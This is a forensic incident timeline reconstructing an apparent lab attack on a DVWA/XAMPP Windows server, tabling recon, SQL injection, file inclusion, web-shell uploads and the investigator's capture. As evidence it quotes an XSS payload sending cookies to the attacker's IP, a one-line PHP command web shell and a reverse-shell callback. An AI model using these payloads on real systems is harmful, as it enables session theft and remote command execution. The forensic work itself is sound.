# Master timeline — ALIHADI-C1-R3 (Challenge #1 Web Server)

Compiled by **sf4b204** (timeline & ledger seat) from `ledger/ledger.md` and the
seats' findings. All times are normalized to **UTC**.

## Time-zone / clock normalization (read first)

| Source | Clock | Normalization |
| --- | --- | --- |
| Disk MAC timeline `catalog/s4a-challenge4/p2048/timeline.csv` | UTC (mactime -d -y) | authoritative |
| Memory capture `windows.info` SystemTime | UTC | authoritative (capture = `2015-09-03 10:04:05Z`) |
| Apache `access.log` / `error.log` | `-0700` (PDT) | add 7h → UTC |
| PHP `php_error_log` | `Europe/Berlin` (UTC+2) | subtract 2h → UTC |
| Memory `pslist` CreateTime | skewed | boot reads `20:27:20Z` then jumps back ~10h at VBoxService sync to `10:29:52Z`; treat `10:xx` side as UTC |

The disk MAC timeline and the memory capture agree exactly (e.g. `ad_driver.sys`
written `2015-09-03 10:04:05Z` = capture instant), so UTC-on-disk is ground truth.

## System / software install phase (pre-attack)

| Time (UTC) | Event | Evidence / source |
| --- | --- | --- |
| 2015-08-23 10:27:20 | System boot (memory pslist reads 20:27:20Z due to ~10h RTC skew) | pslist PID 4; first disk activity 10:29:59Z (FNTCACHE.DAT) |
| 2015-08-23 10:29:52 | Clock corrected by VBoxService (process times switch 20:xx → 10:xx) | pslist VBoxService 20:29:46Z → svchost 892 10:29:52Z |
| 2015-08-23 10:32:17 | XAMPP control panel / Apache / MySQL / FileZilla started (PID 2768/2796/2804/2856) | pslist; httpd.pid, mysql.pid 10:32:23–26Z |
| 2015-08-23 19:36:11 | XAMPP installer `xampp-win32-5.6.11-1-VC11-installer.exe` on Administrator Desktop | timeline inode 12911-128-4 |
| 2015-08-23 21:25–21:26 | Windows features .NET 3.0/3.5 + IIS (WAS/AppHostSvc/InetInfo/ASP.NET) enabled | services/features (sf4b205) |
| 2015-08-23 21:43:54 | Microsoft VC++ 2008 Redistributable x86 9.0.21022 installed | HKLM Uninstall (sf4b205) |
| 2015-08-23 21:44:08 | XAMPP 5.6.11-1 (Bitnami) installed to `C:\xampp` | registry InstallDate 1440366248 (sf4b205) |
| 2015-08-23 21:46–22:05 | Administrator (localhost `::1`, IE7) sets up DVWA via `setup.php` | access.log `::1` |
| 2015-08-23 21:52:25 | DVWA v1.3 placed in web root `C:\xampp\htdocs\DVWA` | timeline DVWA file creation (sf4b205) |
| 2015-08-23 22:24:24 | **Attacker 192.168.56.102 (Kali/Iceweasel) first hits DVWA and brute-forces the login (4 POSTs)** | access.log 15:24:24–15:25:13 -0700 |
| 2015-08-24 07:14:15 | VirtualBox Guest Additions 4.3.30 installed (VBoxGuest/VBoxMouse/VBoxVideo/VBoxSF, VBoxService) | Uninstall key + services (sf4b205) |

## Attack / exploitation phase

| Time (UTC) | Event | Evidence / source |
| --- | --- | --- |
| 2015-08-23 10:53:26 | 4 failed NTLM logons for `Student` from workstation IT104-3 (10.20.0.118) — likely background/lab noise | Security.evtx EID 4625 (sf4b201) |
| 2015-09-02 06:04:40 | Reflected XSS cookie-theft payload (`document.location=http://192.168.56.102/?+document.cookie`) on `xss_r` | access.log 01/Sep 23:04:40 -0700 |
| 2015-09-02 07:10:41 | Attacker recon: dashboard browsing + random-path probes (404s) | access.log |
| 2015-09-02 08:43:29 | Attacker enumerates all DVWA vuln pages (brute/csrf/exec/fi/sqli/sqli_blind/upload/xss_r/xss_s) + CSRF password-change test | access.log (UA MSIE 9.0) |
| 2015-09-02 09:05:06 | Local account **user1 (RID 1005)** created in SAM | SAM hive (sf4b201) |
| 2015-09-02 09:05:22 | POST to DVWA `exec/` (OS command injection) within seconds of the user1 SAM write | access.log (sf4b200) |
| 2015-09-02 09:05:25 | Local account **hacker (RID 1006)** created in SAM | SAM hive (sf4b201) |
| 2015-09-02 09:19:21 | POST to DVWA `exec/` (OS command injection) 3s before RDP-users group change | access.log (sf4b200) |
| 2015-09-02 09:18:32 | `Command Prompt.lnk` (Quick Launch) touched — possible local console interaction | inode 42703-128-1 (sf4b200) |
| 2015-09-02 09:19:24 | Local **Remote Desktop Users** alias modified to add RID 1005 + 1006 (persistence step; inbound RDP itself remains disabled — `fDenyTSConnections=1`) | SAM + SYSTEM hive (sf4b201) |
| 2015-09-02 09:28:30 | Attacker interactive `cmd.exe` (PID 1972, parent explorer.exe) | pslist |
| 2015-09-02 09:30:17 | Local File Inclusion: reads hosts, data.txt, phpMyAdmin `config.inc`, readme_en.txt, ChangeLog, abc.txt | access.log `fi/?page=../../…`; php_error_log |
| 2015-09-02 10:47:34 | Manual SQL injection: `id=1..6`, `' or 1=1`, `UNION SELECT version()/user()/database()`, `information_schema.tables/columns (users)` | access.log sqli |
| 2015-09-02 11:15:40 | **sqlmap 1.0-dev-nongit-20150902** automated SQL injection begins | access.log UA `sqlmap/…` |
| 2015-09-02 11:19:29 | sqlmap flood (2,240 sqli requests; ~200 PHP sessions in /xampp/tmp in ~2s) | access.log; timeline sess_* |
| 2015-09-02 11:25:52 | sqlmap `INTO OUTFILE` writes tmp webshells `tmpukudk.php`/`tmpbiwuc.php`, `tmpudvfh.php`/`tmpbrjvl.php`, tests, then deletes them | access.log (sf4b203) |
| 2015-09-03 06:49:23 | New PHP session — attacker returns | timeline sess_gt9jmpq… |

## Web-shell upload & post-exploitation

| Time (UTC) | Event | Evidence / source |
| --- | --- | --- |
| 2015-09-03 07:10:15 | Upload `phpshell.php` (31 B, `system($_GET["cmd"])`) via DVWA upload | access.log POST /upload; inode 62330 |
| 2015-09-03 07:14:48 | Upload `webshells.zip` (42,095 B) | inode 62331 |
| 2015-09-03 07:14:51 | Extract `c99.php` + `webshell.php` into `/xampp/htdocs/DVWA/` | inodes 62333, 62334 |
| 2015-09-03 07:15:58 | Run commands via `phpshell.php?cmd=dir`, `dir C:\`, `mkdir abc` | access.log |
| 2015-09-03 07:17:58 | Create `/DVWA/hackable/uploads/abc/` | inode 62335 |
| 2015-09-03 07:19:32 | First access `c99.php` (PHP parse error line 2565) | access.log; php_error_log |
| 2015-09-03 07:20:14 | Stage second c99 copy in Temp (`c99 (2).php`, later deleted) | inode 62338 |
| 2015-09-03 07:20:45 | Edit `c99.php` (mtime) | inode 62333 m.c. |
| 2015-09-03 07:21:28 | Run commands via `c99.php?act=cmd` | access.log POST |
| 2015-09-03 07:21:37 | Attempt local account adds via `net user /add` — 3× fail password policy (weak pw) | error.log `NET HELPMSG 2245` ×3 |
| 2015-09-03 07:31:30 | Upload `phpshell2.php` (945 B) — reverse-shell stager → `192.168.56.102:4545` | access.log POST /upload; inode 62337 |
| 2015-09-03 07:31:54 | Access `phpshell2.php` | access.log |
| 2015-09-03 07:34:51 | Apache `access.log` last modified — HTTP activity ends | inode 59684 |

## Capture (investigator) phase

| Time (UTC) | Event | Evidence / source |
| --- | --- | --- |
| 2015-09-03 10:03:06 | `TrustedInstaller.exe` (PID 3848) running | pslist |
| 2015-09-03 10:03:37 | **FTK Imager** launched from `\\Vboxsvr\101\FTK-Imager\` | pslist PID 2120 |
| 2015-09-03 10:04:05 | `ad_driver.sys` (AccessData FTK Imager driver) dropped to Administrator Temp | inode 60402 (NOT attacker) |
| 2015-09-03 10:04:05 | **Memory captured** (system time = 2015-09-03 10:04:05 UTC) | windows.info SystemTime |

## Memory-forensics observations (context)

| Time (UTC) | Event | Evidence / source |
| --- | --- | --- |
| 2015-09-03 10:04:05 | Identical RWX private VAD stubs (`b0 00 eb 70 … 33 c9 8a c8 81 c1 80…ff 25`) in explorer/svchost/FTK Imager/xampp-control, but **no thread start addresses land in them** → consistent with shared thunk/RPC glue, not confirmed live shellcode | malfind + threads (sf4b202) |

## Bottom line

- **Boot to capture window**: `2015-08-23 ~10:27Z` → `2015-09-03 10:04:05Z`.
- **Attack window**: first contact `2015-08-23 22:24Z`; active exploitation `2015-09-02 06:04Z–11:25Z` and `2015-09-03 06:49Z–07:34Z`.
- **Attacker**: `192.168.56.102` (Kali Linux: Iceweasel + sqlmap). **Victim**: `192.168.56.101` (Windows Server 2008 x86, XAMPP/DVWA).
- **Accounts added**: `user1` (RID 1005) and `hacker` (RID 1006), both added to Remote Desktop Users (see ledger sf4b201).
- **Software installed by attacker**: none (see ledger sf4b205).
